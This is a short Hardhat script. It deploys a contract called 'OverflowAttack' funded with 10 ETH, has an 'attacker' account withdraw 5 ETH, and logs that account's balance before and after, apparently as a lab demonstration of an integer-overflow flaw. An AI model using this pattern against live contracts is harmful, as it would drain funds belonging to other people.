const hre = require("hardhat");

async function main() {
    const [deployer, attacker] = await hre.ethers.getSigners();
    const ethers = hre.ethers;

    const Factory = await hre.ethers.getContractFactory("OverflowAttack", deployer);
    const contract = await Factory.deploy({ value: ethers.parseEther("10") });
    await contract.waitForDeployment();
    console.log("✅ Deployed to:", contract.target);

    let beforeEth = await hre.ethers.provider.getBalance(attacker.address);
    console.log(`\n[Attacker's Balance]: ${ethers.formatEther(beforeEth)} ETH`);

    const tx = await contract.connect(attacker).withdraw(ethers.parseEther("5"));
    await tx.wait();

    let afterEth = await hre.ethers.provider.getBalance(attacker.address);
    console.log(`[Attacker's Balance]: ${ethers.formatEther(afterEth)} ETH`);
}

main().catch(console.error);
